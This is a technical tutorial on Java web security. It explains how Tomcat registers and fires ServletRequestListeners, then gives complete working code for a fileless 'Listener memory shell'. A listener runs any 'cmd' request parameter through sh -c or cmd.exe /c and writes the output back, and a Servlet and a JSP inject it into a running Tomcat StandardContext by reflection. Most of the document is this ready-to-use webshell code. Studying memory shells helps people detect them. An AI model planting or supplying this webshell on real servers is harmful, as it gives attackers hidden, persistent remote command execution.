# Java Security Of Tomcat Listener

## Preparation

​ When I learned about the `Filter` memory horse and the `Servlet` memory horse, it is not difficult to see that the implementation of the `Filter`/`Servlet` is dynamically registered and written in it, so that the command can be executed while landing without files.

`Listener` is divided into the following types:

- `ServletContextListener`, triggered when server starts and terminates;
- `HttpSessionListener`, triggered when the `Session` operation is concerned;
- `ServletRequestListener`, triggered when accessing the service.

Among them, `ServletRequestListener` is most suitable for use as a memory horse, because `ServletRequestListener` is used to listen to `ServletRequest` object. When accessing any resource, the `ServletRequestListener#requestInitialized` method will be triggered.

![](img/1.png)

## Process Analysis

Environment construction:

```java
package listener;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;

@WebListener()
public class HelloListener implements ServletRequestListener {

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        String name = sre.getServletRequest().getClass().getName();
        System.out.println(name);
        System.out.println("Listener...");
    }
}
```

​ Follow up on `javax.servlet.ServletRequestEvent`, which can obtain `ServletRequest` through the `getServletRequest` method.

![](img/3.png)

​ When running the `Demo` of the build, you can see that each request will trigger the `Listener`, and the `ServletRequest` obtained by the `getServletRequest` method is `org.apache.catalina.connector.RequestFacade`. And there is a `Request` property in the property of `org.apache.catalina.connector.RequestFacade`, which can be obtained through reflection. You can see the `reuqest` property in the request successfully obtained in the sample code below.

```java
package listener;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import java.lang.reflect.Field;

@WebListener()
public class HelloListener implements ServletRequestListener {

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        RequestFacade request = (RequestFacade) sre.getServletRequest();
        try {
            Class<?> aClass = Class.forName("org.apache.catalina.connector.RequestFacade");
            Field field = aClass.getDeclaredField("request");
            field.setAccessible(true);
            Request request1 = (Request) field.get(request);
            System.out.println(request1);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![](img/4.png)

​ Get the `Request` property through reflection, get the requested parameters to be used to execute the command, and use its `Response` to echo the result of the command execution.

```java
package listener;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

@WebListener()
public class HelloListener implements ServletRequestListener {

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        RequestFacade request = (RequestFacade) sre.getServletRequest();
        String cmd = request.getParameter("cmd");
        try {
            Class<?> aClass = Class.forName("org.apache.catalina.connector.RequestFacade");
            Field field = aClass.getDeclaredField("request");
            field.setAccessible(true);
            Request request1 = (Request) field.get(request);
            Response response = request1.getResponse();

            if (cmd != null) {
                boolean isLinux = true;
                String osType = System.getProperty("os.name");
                if (osType != null && osType.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] command = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream inputStream = Runtime.getRuntime().exec(
command).getInputStream();
                Scanner scanner = new Scanner(inputStream).useDelimiter("h3rmesk1t");
                String output = scanner.hasNext() ? scanner.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![](img/5.png)

​ The above analysis shows how to construct a malicious `Listener`, and then take a look at how to dynamically register the malicious `Listener` constructed above. When analyzing the `Tomcat Architecture`, it was mentioned that in the `startInternal` method of the `org.apache.catalina.core.StandardContext` class, `listenerStart`, `filterStart` and `loadOnStartup` will be called respectively to trigger the `Listener`, `Filter`, and `Servlet` construct loading respectively.

Follow up on the `org.apache.catalina.core.StandardContext#listenerStart` method, which calls the `org.apache.catalina.core.StandardContext#findApplicationListeners` method to get the `listeners` array, then take it out one by one from the `listeners` array and instantiate it, and then save it into the `results` array.

​ Then iterate over the `results` array and add it to the `eventListeners` array and `lifecycleListeners` array respectively according to different types of `Listeners`. The `org.apache.catalina.core.StandardContext#setApplicationEventListeners` method will be called to clear the `applicationEventListenersList` and reassign the value. The `applicationEventListenersList` stores the `listener` that was instantiated before.

![](img/6.png)

![](img/7.png)

![](img/8.png)

​ From the above analysis, we can see that the `org.apache.catalina.core.StandardContext#listenerStart` method will instantiate the `Listener` and add it to the `applicationEventListenersList`. Then let's see how to trigger the instantiated `Listener`.

​ Put a breakpoint in the `requestInitialized` method in Demo` and see what methods are called before the `requestInitialized` method. Follow up on the `org.apache.catalina.core.StandardContext#fireRequestInitEvent` method, which calls the `org.apache.catalina.core.StandardContext#getApplicationEventListeners` method, and the `getApplicationEventListeners` method returns exactly the previous `applicationEventListenersList`. Then iterate over the `instances` array and call the `requestInitialized` method of each `listener`. Therefore, if the constructed malicious `Listener` can be added to the `applicationEventListener`, the constructed malicious `Listener` can be called.

![](img/9.png)

![](img/10.png)

## Achievement

### Idea

​ The specific ideas for dynamically injecting `Listener` memory horse are as follows:

- Inherit and write a malicious `Listener`;
- Get `StandardContext`;
- Call `StandardContext#addApplicationEventListener` to add malicious `Listener`.

### Dynamic Registration

#### Servlet

```java
package servlet;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.ServletContext;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

@WebServlet(name = "ListenerMemoryShellServlet", value = "/ListenerMemoryShellServlet")
public class ListenerMemoryShellServlet extends HelloServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        super.doGet(request, response);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) {
        try {
            ServletContext servletContext = request.getSession().getServletContext();
            Field context = servletContext.getClass().getDeclaredField("context");
            context.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) context.get(servletContext);
            Field context1 = applicationContext.getClass().getDeclaredField("context");
            context1.setAccessible(true);
            StandardContext standardContext = (StandardContext) context1.get(applicationContext);

            ServletRequestListener listener = new ServletRequestListener() {
                @Override
                public void requestDestroyed(ServletRequestEvent sre) {
                }

                @Override
                public void requestInitialized(ServletRequestEvent sre) {
                    RequestFacade requestFacade = (RequestFacade) sre.getServletRequest();
try {
                        String cmd = request.getParameter("cmd");
                        Field requestField = RequestFacade.class.getDeclaredField("request");
                        requestField.setAccessible(true);
                        Request request = (Request) requestField.get(requestFacade);
                        Response response = request.getResponse();

                        if (cmd != null) {
                            boolean isLinux = true;
                            String osType = System.getProperty("os.name");
                            if (osType != null && osType.toLowerCase().contains("win")) {
                                isLinux = false;
                            }

                            String[] command = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                            InputStream inputStream = Runtime.getRuntime().exec(command).getInputStream();
                            Scanner scanner = new Scanner(inputStream).useDelimiter("h3rmesk1t");
                            String output = scanner.hasNext() ? scanner.next() : "";
                            response.getWriter().write(output);
                            response.getWriter().flush();
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            };
            standardContext.addApplicationEventListener(listener);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![](img/11.png)

### JSP

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    ServletContext servletContext = request.getSession().getServletContext();
    Field context = servletContext.getClass().getDeclaredField("context");
    context.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) context.get(servletContext);
    Field context1 = applicationContext.getClass().getDeclaredField("context");
    context1.setAccessible(true);
    StandardContext standardContext = (StandardContext) context1.get(applicationContext);

    ServletRequestListener listener = new ServletRequestListener() {
        @Override
        public void requestDestroyed(ServletRequestEvent sre) {
        }

        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            RequestFacade requestFacade = (RequestFacade) sre.getServletRequest();
            try {
                String cmd = request.getParameter("cmd");
                Field requestField = RequestFacade.class.getDeclaredField("request");
                requestField.setAccessible(true);
                Request request = (Request) requestField.get(requestFacade);
                Response response = request.getResponse();

                if (cmd != null) {
                    boolean isLinux = true;
                    String osType = System.getProperty("os.name");
                    if (osType != null && osType.toLowerCase().contains("win")) {
                        isLinux = false;
                    }

                    String[] command = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                    InputStream inputStream = Runtime.getRuntime().exec(command).getInputStream();
                    Scanner scanner = new Scanner(inputStream).useDelimiter("h3rmesk1t");
                    String output = scanner.hasNext() ? scanner.next() : "";
                    response.getWriter()
.write(output);
                    response.getWriter().flush();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    };
    standardContext.addApplicationEventListener(listener);
    response.getWriter().write("Listener Inject Successfully...");
%>
```

![](img/12.png)